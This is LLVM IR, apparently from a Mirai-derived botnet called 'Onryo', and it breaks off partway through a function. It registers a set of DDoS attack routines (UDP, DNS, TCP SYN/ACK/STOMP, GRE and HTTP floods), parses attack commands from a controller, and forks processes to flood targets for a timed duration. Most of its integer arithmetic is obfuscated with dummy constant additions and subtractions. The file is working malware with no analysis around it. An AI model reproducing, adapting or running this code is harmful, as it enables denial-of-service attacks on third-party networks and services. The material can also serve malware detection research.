; ModuleID = 'host/ir_sub/Onryo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.attack_http_state = type { i32, i8, i32, i32, i32, [512 x i8], [257 x i8], [129 x i8], [513 x i8], [9 x i8], [9 x i8], i32, i32, i32, i32, i32, [5 x [128 x i8]], i32, [1024 x i8] }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [3 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c"\0D\0AHost: \00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"Cookie: \00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"; \00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.10 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"url=\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"'\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00", align 16
@table = common global [81 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -559038737, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_generic)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_vse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_plain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_syn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_ack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_tcp_stomp)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_eth)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 %17, 496397207
  %19 = add i32 %18, 1
  %20 = add i32 %19, 496397207
  %21 = add nsw i32 %17, 1
  %22 = sext i32 %20 to i64
  %23 = mul i64 %22, 8
  %24 = call i8* @realloc(i8* %15, i64 %23) #6
  %25 = bitcast i8* %24 to %struct.attack_method**
  store %struct.attack_method** %25, %struct.attack_method*** @methods, align 8
  %26 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %27 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %28 = load i8, i8* @methods_len, align 1
  %29 = sub i8 %28, 89
  %30 = add i8 %29, 1
  %31 = add i8 %30, 89
  %32 = add i8 %28, 1
  store i8 %31, i8* @methods_len, align 1
  %33 = zext i8 %28 to i64
  %34 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %27, i64 %33
  store %struct.attack_method* %26, %struct.attack_method** %34, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 3
  br i1 %4, label %5, label %28

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = sub i32 0, %22
  %24 = sub i32 0, 1
  %25 = add i32 %23, %24
  %26 = sub i32 0, %25
  %27 = add nsw i32 %22, 1
  store i32 %26, i32* %1, align 4
  br label %2

; <label>:28:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %249

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, -3807103076300409740
  %27 = sub i64 %26, 4
  %28 = add i64 %27, -3807103076300409740
  %29 = sub i64 %25, 4
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %4, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %17
  br label %249

; <label>:34:                                     ; preds = %17
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %3, align 8
  %37 = load i8, i8* %35, align 1
  store i8 %37, i8* %7, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = sub i64 %39, 6295522254105663038
  %41 = sub i64 %40, 1
  %42 = add i64 %41, 6295522254105663038
  %43 = sub i64 %39, 1
  %44 = trunc i64 %42 to i32
  store i32 %44, i32* %4, align 4
  %45 = load i32, i32* %4, align 4
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %34
  br label %249

; <label>:48:                                     ; preds = %34
  %49 = load i8*, i8** %3, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %3, align 8
  %51 = load i8, i8* %49, align 1
  store i8 %51, i8* %8, align 1
  %52 = load i32, i32* %4, align 4
  %53 = sext i32 %52 to i64
  %54 = sub i64 %53, 5657966602691174824
  %55 = sub i64 %54, 1
  %56 = add i64 %55, 5657966602691174824
  %57 = sub i64 %53, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %4, align 4
  %59 = load i8, i8* %8, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %48
  br label %249

; <label>:63:                                     ; preds = %48
  %64 = load i32, i32* %4, align 4
  %65 = sext i32 %64 to i64
  %66 = load i8, i8* %8, align 1
  %67 = zext i8 %66 to i64
  %68 = mul i64 5, %67
  %69 = icmp ult i64 %65, %68
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %63
  br label %249

; <label>:71:                                     ; preds = %63
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i64
  %74 = call noalias i8* @calloc(i64 %73, i64 24) #6
  %75 = bitcast i8* %74 to %struct.attack_target*
  store %struct.attack_target* %75, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %76

; <label>:76:                                     ; preds = %126, %71
  %77 = load i32, i32* %5, align 4
  %78 = load i8, i8* %8, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp slt i32 %77, %79
  br i1 %80, label %81, label %132

; <label>:81:                                     ; preds = %76
  %82 = load i8*, i8** %3, align 8
  %83 = bitcast i8* %82 to i32*
  %84 = load i32, i32* %83, align 4
  %85 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %86 = load i32, i32* %5, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 1
  store i32 %84, i32* %89, align 4
  %90 = load i8*, i8** %3, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 4
  store i8* %91, i8** %3, align 8
  %92 = load i8*, i8** %3, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %3, align 8
  %94 = load i8, i8* %92, align 1
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 2
  store i8 %94, i8* %99, align 4
  %100 = load i32, i32* %4, align 4
  %101 = sext i32 %100 to i64
  %102 = add i64 %101, 1490434522306582833
  %103 = sub i64 %102, 5
  %104 = sub i64 %103, 1490434522306582833
  %105 = sub i64 %101, 5
  %106 = trunc i64 %104 to i32
  store i32 %106, i32* %4, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 0
  store i16 2, i16* %112, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 1
  %118 = load i32, i32* %117, align 4
  %119 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i64 %121
  %123 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i32 0, i32 0
  %124 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %123, i32 0, i32 2
  %125 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %124, i32 0, i32 0
  store i32 %118, i32* %125, align 4
  br label %126

; <label>:126:                                    ; preds = %81
  %127 = load i32, i32* %5, align 4
  %128 = add i32 %127, 1066565694
  %129 = add i32 %128, 1
  %130 = sub i32 %129, 1066565694
  %131 = add nsw i32 %127, 1
  store i32 %130, i32* %5, align 4
  br label %76

; <label>:132:                                    ; preds = %76
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = icmp ult i64 %134, 1
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %132
  br label %249

; <label>:137:                                    ; preds = %132
  %138 = load i8*, i8** %3, align 8
  %139 = getelementptr inbounds i8, i8* %138, i32 1
  store i8* %139, i8** %3, align 8
  %140 = load i8, i8* %138, align 1
  store i8 %140, i8* %9, align 1
  %141 = load i32, i32* %4, align 4
  %142 = sext i32 %141 to i64
  %143 = sub i64 0, 1
  %144 = add i64 %142, %143
  %145 = sub i64 %142, 1
  %146 = trunc i64 %144 to i32
  store i32 %146, i32* %4, align 4
  %147 = load i8, i8* %9, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp sgt i32 %148, 0
  br i1 %149, label %150, label %241

; <label>:150:                                    ; preds = %137
  %151 = load i8, i8* %9, align 1
  %152 = zext i8 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 16) #6
  %154 = bitcast i8* %153 to %struct.attack_option*
  store %struct.attack_option* %154, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %155

; <label>:155:                                    ; preds = %233, %150
  %156 = load i32, i32* %5, align 4
  %157 = load i8, i8* %9, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp slt i32 %156, %158
  br i1 %159, label %160, label %240

; <label>:160:                                    ; preds = %155
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %160
  br label %249

; <label>:165:                                    ; preds = %160
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  %169 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %170 = load i32, i32* %5, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %172, i32 0, i32 1
  store i8 %168, i8* %173, align 8
  %174 = load i32, i32* %4, align 4
  %175 = sext i32 %174 to i64
  %176 = sub i64 0, 1
  %177 = add i64 %175, %176
  %178 = sub i64 %175, 1
  %179 = trunc i64 %177 to i32
  store i32 %179, i32* %4, align 4
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = icmp ult i64 %181, 1
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %165
  br label %249

; <label>:184:                                    ; preds = %165
  %185 = load i8*, i8** %3, align 8
  %186 = getelementptr inbounds i8, i8* %185, i32 1
  store i8* %186, i8** %3, align 8
  %187 = load i8, i8* %185, align 1
  store i8 %187, i8* %12, align 1
  %188 = load i32, i32* %4, align 4
  %189 = sext i32 %188 to i64
  %190 = sub i64 0, 1
  %191 = add i64 %189, %190
  %192 = sub i64 %189, 1
  %193 = trunc i64 %191 to i32
  store i32 %193, i32* %4, align 4
  %194 = load i32, i32* %4, align 4
  %195 = load i8, i8* %12, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp slt i32 %194, %196
  br i1 %197, label %198, label %199

; <label>:198:                                    ; preds = %184
  br label %249

; <label>:199:                                    ; preds = %184
  %200 = load i8, i8* %12, align 1
  %201 = zext i8 %200 to i32
  %202 = sub i32 0, 1
  %203 = sub i32 %201, %202
  %204 = add nsw i32 %201, 1
  %205 = sext i32 %203 to i64
  %206 = call noalias i8* @calloc(i64 %205, i64 1) #6
  %207 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %208 = load i32, i32* %5, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %210, i32 0, i32 0
  store i8* %206, i8** %211, align 8
  %212 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %213 = load i32, i32* %5, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %215, i32 0, i32 0
  %217 = load i8*, i8** %216, align 8
  %218 = load i8*, i8** %3, align 8
  %219 = load i8, i8* %12, align 1
  %220 = zext i8 %219 to i32
  call void @util_memcpy(i8* %217, i8* %218, i32 %220)
  %221 = load i8, i8* %12, align 1
  %222 = zext i8 %221 to i32
  %223 = load i8*, i8** %3, align 8
  %224 = sext i32 %222 to i64
  %225 = getelementptr inbounds i8, i8* %223, i64 %224
  store i8* %225, i8** %3, align 8
  %226 = load i8, i8* %12, align 1
  %227 = zext i8 %226 to i32
  %228 = load i32, i32* %4, align 4
  %229 = sub i32 %228, -1984476138
  %230 = sub i32 %229, %227
  %231 = add i32 %230, -1984476138
  %232 = sub nsw i32 %228, %227
  store i32 %231, i32* %4, align 4
  br label %233

; <label>:233:                                    ; preds = %199
  %234 = load i32, i32* %5, align 4
  %235 = sub i32 0, %234
  %236 = sub i32 0, 1
  %237 = add i32 %235, %236
  %238 = sub i32 0, %237
  %239 = add nsw i32 %234, 1
  store i32 %238, i32* %5, align 4
  br label %155

; <label>:240:                                    ; preds = %155
  br label %241

; <label>:241:                                    ; preds = %240, %137
  %242 = call i32* @__errno_location() #7
  store i32 0, i32* %242, align 4
  %243 = load i32, i32* %6, align 4
  %244 = load i8, i8* %7, align 1
  %245 = load i8, i8* %8, align 1
  %246 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %247 = load i8, i8* %9, align 1
  %248 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %243, i8 zeroext %244, i8 zeroext %245, %struct.attack_target* %246, i8 zeroext %247, %struct.attack_option* %248)
  br label %249

; <label>:249:                                    ; preds = %241, %198, %183, %164, %136, %70, %62, %47, %33, %16
  %250 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %251 = icmp ne %struct.attack_target* %250, null
  br i1 %251, label %252, label %255

; <label>:252:                                    ; preds = %249
  %253 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %254 = bitcast %struct.attack_target* %253 to i8*
  call void @free(i8* %254) #6
  br label %255

; <label>:255:                                    ; preds = %252, %249
  %256 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %257 = icmp ne %struct.attack_option* %256, null
  br i1 %257, label %258, label %262

; <label>:258:                                    ; preds = %255
  %259 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %260 = load i8, i8* %9, align 1
  %261 = zext i8 %260 to i32
  call void @free_opts(%struct.attack_option* %259, i32 %261)
  br label %262

; <label>:262:                                    ; preds = %258, %255
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #6
  %35 = call i32 @kill(i32 %34, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %74

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %74

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = sub i32 0, %68
  %70 = sub i32 0, 1
  %71 = add i32 %69, %70
  %72 = sub i32 0, %71
  %73 = add nsw i32 %68, 1
  store i32 %72, i32* %15, align 4
  br label %37

; <label>:74:                                     ; preds = %54, %37
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %39

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %36

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %23, i64 %25
  %27 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  call void @free(i8* %28) #6
  br label %29

; <label>:29:                                     ; preds = %22, %14
  br label %30

; <label>:30:                                     ; preds = %29
  %31 = load i32, i32* %5, align 4
  %32 = add i32 %31, -1531055850
  %33 = add i32 %32, 1
  %34 = sub i32 %33, -1531055850
  %35 = add nsw i32 %31, 1
  store i32 %34, i32* %5, align 4
  br label %10

; <label>:36:                                     ; preds = %10
  %37 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %38 = bitcast %struct.attack_option* %37 to i8*
  call void @free(i8* %38) #6
  br label %39

; <label>:39:                                     ; preds = %36, %8
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i32 @getppid() #1

; Function Attrs: noinline nounwind uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option*, i8 zeroext, i8*) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %11

; <label>:11:                                     ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %42

; <label>:16:                                     ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
